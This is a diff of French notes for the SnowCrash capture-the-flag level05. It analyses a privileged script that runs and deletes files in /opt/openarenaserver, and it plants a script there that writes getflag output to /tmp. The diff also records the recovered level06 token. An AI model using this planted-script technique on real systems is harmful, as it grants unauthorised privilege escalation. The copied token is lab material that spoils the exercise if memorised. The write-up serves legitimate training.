@@ -272,6 +272,7 @@ echo $y affiche la sortie de getflag.
 
 --------------------------------------------------------------------------------
 
+
 LEVEL05
 
 - ls -l : vide
@@ -282,13 +283,117 @@ LEVEL05
     sbin : peut etre mount.ecryptfs_private ?
     usr/sbin : ls -l : -rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
 
-- cat openarenaserver 
-    #!/bin/sh
+- cat openarenaserver :
 
-    for i in /opt/openarenaserver/* ; do
-        (ulimit -t 5; bash -x "$i")
-        rm -f "$i"
-    done
+        #!/bin/sh
+
+        for i in /opt/openarenaserver/* ; do
+            (ulimit -t 5; bash -x "$i")
+            rm -f "$i"
+        done
+
+- Dcomposons ce code : 
+
+        #!/bin/sh  -> shebang : script executer en sh
+
+        for i in /opt/openarenaserver/* ; do       -> Boucle sur tous les fichiers du dossier /opt/openarenaserver/ et stocke chaque chemin dans la variable $i.
+            (ulimit -t 5; bash -x "$i")         |  -> Exécute chaque fichier dans un sous-shell.
+                                                        ulimit -t 5 limite le temps CPU à 5 secondes pour éviter des scripts qui tournent trop longtemps.
+                                                        bash -x "$i" lance le script $i en mode debug, donc chaque commande exécutée sera affichée.
+            rm -f "$i"                             -> Supprime le fichier après l’exécution.
+        done                                       -> Ferme la boucle for
+
+
+- cd opt/openarenaserver : ls -l total 0
+
+- Open a rena server ? -> Rena ?
+    Non, Arena server : un programme qui gère un service multi-utilisateur, souvent pour des jeux ou des simulations compétitives
+                        Dans un jeu en ligne, le arena server serait le programme qui gère les combats entre joueurs, l’état du terrain, les scores, etc.
+                        Les joueurs (clients) ne font qu’envoyer des commandes et recevoir des informations
+
+- Idee : faire un fichier qui exectute getflag et renvoie sont print : le token.
+        
+        touch test.sh ->ok
+        vim test.sh 
+        cat test.sh 
+            #!/bin/bash
+            getflag
+        ./test.sh
+        bash: ./test.sh: Permission denied
+
+- Besoin de plus de droit ? 
+    
+    chmod -x test.sh ->ok
+    ./test.sh
+    bash: ./test.sh: Permission denied
+
+   -> Je n'ai pas les droit d'executer moi meme un script, je doit attendre qu'il s'execute seul via le script que j'ai trouver ?
+        Donc pas besoin de chmod
+
+    Il suffit que mon fichier soit dans /opt/openarenaserver/ au moment où le serveur tourne, et il sera exécuté par le serveur automatiquement.
+
+- Comment declancher le script ? 
+    - Idee : retourner dans usr/bin et voir si je peux lancer openarenaserver ici 
+
+        level05@SnowCrash:/usr/sbin$ ./openarenaserver
+                          bash: ./openarenaserver: Permission denied
+    
+    - J'essaie de me donner des droit d'execussion avec chmod dans usr/sbin:
+        chmod -x openarenaserver 
+        chmod: changing permissions of `openarenaserver': Operation not permitted
+
+    -Idee : Chercher un crontab : qui permet de planifier l’exécution automatique de commandes ou scripts à intervalles réguliers
+
+        level05@SnowCrash:/usr/sbin$ grep -r cron .
+        Binary file ./apache2 matches
+        Binary file ./atd matches
+        Binary file ./cron matches
+        ./delgroup:    if (system("crontab -l $user >/dev/null 2>&1") == 0) {
+        ./delgroup:      # crontab -l returns 1 if there is no crontab
+        ./delgroup:      my $crontab = &which('crontab');
+        ./delgroup:      &systemcall($crontab, "-r", $user);
+        ./delgroup:      s_print (gtx("Removing crontab ...\n"));
+        ./deluser:    if (system("crontab -l $user >/dev/null 2>&1") == 0) {
+        ./deluser:      # crontab -l returns 1 if there is no crontab
+        ./deluser:      my $crontab = &which('crontab');
+        ./deluser:      &systemcall($crontab, "-r", $user);
+        ./deluser:      s_print (gtx("Removing crontab ...\n"));
+        Binary file ./rotatelogs matches
+        Binary file ./rsyslogd matches
+        Binary file ./tcpdump matches
+
+    -> Pas forcement la meilleur idee, Pour toucher un crontab je vais surement avoir besoin des droit (que je n'ai pas et ne peux pas me donner via chmod)
+        Je change de piste
+    
+    -Realisation : En regardant mes notes au dessus, j'ai mis :  chmod -x test.sh ->ok -> Je m'eneleve le droit d'execution !
+
+    -Je veux chmod +x test.sh dans opt/openarenaserver : chmod: cannot access `test.sh': No such file or directory
+        test.sh a ete supprimer, donc il a ete executer et je ne l'ai pas vue ?
+    
+    - Je refais la manip touch,vim,cat,chamod + et j'attend de voir (2min, si mon flag apparait)
+        test.sh a encore disparu sans rien afficher
+    
+    -Je rajoute un print dans mon script.
+
+        #!/bin/bash
+        echo $(getflag)
+
+        test.sh a encore disparu sans rien afficher
+
+    -Realisation : Mon script est exécuté dans un sous-shell ! Rien ne sors sur mon terminal, c'est normal
+
+    -Idee : Rediriger la sortie vers un .txt dans mon /tmp
+
+        #!/bin/bash
+        getflag > /tmp/flag.txt 2>&1
+
+        Je pourrais cat mon .txt apres que mon .sh ai disparu
+
+    - cat /tmp/flag.txt
+            Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+    -su level06 : viuaaale9huek52boumoomioc
+
 
 
 
